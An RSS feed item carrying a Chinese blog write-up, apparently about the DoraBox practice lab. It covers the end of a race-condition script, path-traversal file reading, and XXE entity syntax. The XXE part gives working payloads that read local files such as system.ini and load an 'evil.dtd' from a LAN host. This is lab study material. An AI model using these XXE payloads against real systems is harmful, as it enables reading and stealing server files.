class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = RaceCondition()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.join() &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_jz_upload002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-20&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。&lt;/p&gt;
&lt;p&gt;python 类变量，它的值将在这个类的所有实例之间共享。（还有在_&lt;em&gt;init&lt;/em&gt;_() 的时候 self. 变量，这和 java 区别还蛮大的）&lt;/p&gt;
&lt;p&gt;心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。&lt;/p&gt;
&lt;p&gt;最后，这道题真的好帅啊！！！&lt;/p&gt;
&lt;h1 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h1&gt;
&lt;p&gt;输入…/，发现是可以直接读文件的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_readanyfile002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-21&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;直接读取文件&lt;img src=&#34;dorabox_readanyfile001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-21&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;这个，emmmm，这样的漏洞，很难找把？（傻喵）&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; xxe&lt;/h1&gt;
&lt;p&gt;靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xxe001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-22&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xxe002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;构造 xml 文件读取 attack.php&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;Sakura&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY a &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt;  &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///C:/Users/lenovo/Desktop/attack.php&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;user&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;a;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;桜桜私はあなたを愛しています&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;user&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-22&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;xxe 就是外部实体注入嘛，可以一行代码禁用。&lt;/p&gt;
&lt;p&gt;xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。&lt;/p&gt;
&lt;p&gt;1、 当引用的 DTD 文件是&lt;strong&gt;本地文件&lt;/strong&gt;的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;quot;DTD文件路径&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2、 如果引用的 DTD 文件是一个&lt;strong&gt;公共文件&lt;/strong&gt;时，采用 PUBLIC 标识，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE 根元素 PUBLIC &amp;quot;DTD名称&amp;quot; &amp;quot;DTD文件的URL&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;1. 内部实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY 实体名称 &#34;实体的值&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;foo&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;meta-keyword&#34;&gt;foo&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;ANY&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;Thinking&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;foo&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;foo&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2. 外部实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY 实体名称 SYSTEM &#34;URI/URL&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;copyright&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://www.runoob.com/entities.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;login&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;test;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;login&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;login&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述两种均为引用实体，主要在&lt;strong&gt; XML 文档中&lt;/strong&gt;被应用，引用方式：&lt;strong&gt;&amp;amp; 实体名称；&lt;/strong&gt; 末尾要带上分号，这个引用将直接转变成实体内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 参数实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY % 实体名称 &#34;实体的值&#34;&gt; 
&lt;!ENTITY % 实体名称 SYSTEM &#34;URI/URL&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;copyright&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://www.runoob.com/entities.dtd&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;%body;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;login&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参数实体，被&lt;strong&gt; DTD 文件&lt;/strong&gt;自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。&lt;/p&gt;
&lt;p&gt;允许&lt;strong&gt;包含外部实体&lt;/strong&gt;，就可能存在 XXE 攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;【利用 1】读取本地文件&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;creds&lt;/span&gt; [  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;goodies&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///c:/windows/system.ini&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt; ]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;creds&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;goodies;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;creds&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;【利用 2】读取含特殊字符的本地文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果文件中含有特殊字符，如 &amp;amp;,&amp;lt;,&amp;gt;,&amp;quot;,&#39; 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;roottag&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;&amp;lt;![CDATA[&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;goodies&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;end&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;]]&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;dtd&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;%dtd; ]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;roottag&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;all;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;roottag&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;最后哦&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后哦&#34;&gt;#&lt;/a&gt; 最后哦&lt;/h1&gt;
&lt;p&gt;小心眼 + 记仇の milkii0，会打败你们的！&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
